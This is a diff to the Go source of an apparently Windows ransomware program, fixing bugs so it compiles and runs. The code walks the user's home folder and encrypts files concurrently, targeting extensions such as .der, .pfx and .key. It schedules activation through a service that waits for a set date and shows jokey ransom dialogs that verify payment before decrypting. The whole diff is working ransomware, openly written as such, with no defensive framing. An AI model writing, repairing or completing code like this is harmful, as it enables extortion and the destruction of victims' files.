@@ -1,5 +1,3 @@
-// +build windows,tor
-
 package main
 
 import (
@@ -9,7 +7,7 @@ import (
     "runtime"
     "path/filepath"
 
-    "github.com/kernullist/gowinsvc"
+    "github.com/sug0/gowinsvc"
     "github.com/sug0/sr-ransomware/go/win"
     "github.com/sug0/sr-ransomware/go/crypto/scheme/victim"
 )
@@ -21,6 +19,8 @@ type service struct {
 }
 
 const cryptoArg = "winmain"
+
+var allExtensions map[string]bool
 
 func main() {
     if len(os.Args) > 1 && os.Args[1] == cryptoArg {
@@ -78,7 +78,7 @@ func cryptoMain() {
     )
 
     switch code {
-    case IDYES:
+    case win.IDYES:
         aesIVKey, err := victim.VerifyPayment()
         if err != nil {
             win.MessageBox(
@@ -100,7 +100,7 @@ func cryptoMain() {
             "ALL DONE, HAVE A GOOD ONE MATE",
             win.MB_OK | win.MB_ICONEXCLAMATION,
         )
-    case IDNO:
+    case win.IDNO:
         win.MessageBox(
             "No worries mate!",
             "In 5 minutes, this dialog will pop up again. ;)",
@@ -142,7 +142,7 @@ func (s *service) beforeDeployment(exit <-chan bool) {
             return
         case t := <-time.After(1 * time.Minute):
             if t.After(s.date) {
-                s.afterDeployment()
+                s.afterDeployment(exit)
             }
         }
     }
@@ -185,7 +185,7 @@ func encryptFiles(done chan<- struct{}) {
     }
     wg := sync.WaitGroup{}
     sem := make(chan struct{}, runtime.NumCPU())
-    filepath.Walk(os.GetEnv("HOMEPATH"), func(path string, ent os.FileInfo, err error) error {
+    filepath.Walk(os.Getenv("HOMEPATH"), func(path string, ent os.FileInfo, err error) error {
         wg.Add(1)
         go func() {
             sem <- struct{}{}
@@ -198,6 +198,7 @@ func encryptFiles(done chan<- struct{}) {
             }
             victim.EncryptFile(pk, path)
         }()
+        return nil
     })
     wg.Wait()
 }
@@ -209,7 +210,7 @@ func decryptFiles(aesIVKey []byte) {
     }
     wg := sync.WaitGroup{}
     sem := make(chan struct{}, runtime.NumCPU())
-    filepath.Walk(os.GetEnv("HOMEPATH"), func(path string, ent os.FileInfo, err error) error {
+    filepath.Walk(os.Getenv("HOMEPATH"), func(path string, ent os.FileInfo, err error) error {
         wg.Add(1)
         go func() {
             sem <- struct{}{}
@@ -222,18 +223,19 @@ func decryptFiles(aesIVKey []byte) {
             }
             victim.DecryptFile(sk, path)
         }()
+        return nil
     })
     wg.Wait()
 }
 
-func (s *service) validExtension(path string) bool {
-    s.initExtensions()
-    return s.ext[filepath.Ext(path)]
+func validExtension(path string) bool {
+    initExtensions()
+    return allExtensions[filepath.Ext(path)]
 }
 
-func (s *service) initExtensions() {
-    if s.ext == nil {
-        s.ext = map[string]bool{
+func initExtensions() {
+    if allExtensions == nil {
+        allExtensions = map[string]bool{
             ".der": true,
             ".pfx": true,
             ".key": true,
